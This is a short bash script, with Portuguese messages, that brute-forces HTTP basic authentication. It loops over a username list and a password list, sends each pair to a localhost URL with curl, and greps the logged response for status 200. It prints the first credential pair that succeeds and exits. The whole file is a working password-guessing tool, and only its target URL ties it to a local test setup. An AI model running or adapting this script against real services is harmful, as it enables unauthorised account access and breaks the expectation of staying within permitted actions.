#!/bin/bash
while read line
do
  #echo -e "$line"
        while read line2
do

        curl -v --user $line:$line2 http://localhost/baf/ &> logs_curl
	LEITURA=$(cat logs_curl | grep 200 | cut -d " " -f3 | head -1)
	#echo $LEITURA
	if test "$LEITURA" = "200" 
	then
		echo "Usuário e Senha: $line $line2"
		#break
		exit
	else
		echo "....."
		#brea
		echo $line $line2
	fi
        #echo $line $line2
done < arquivo
done < arquivo2
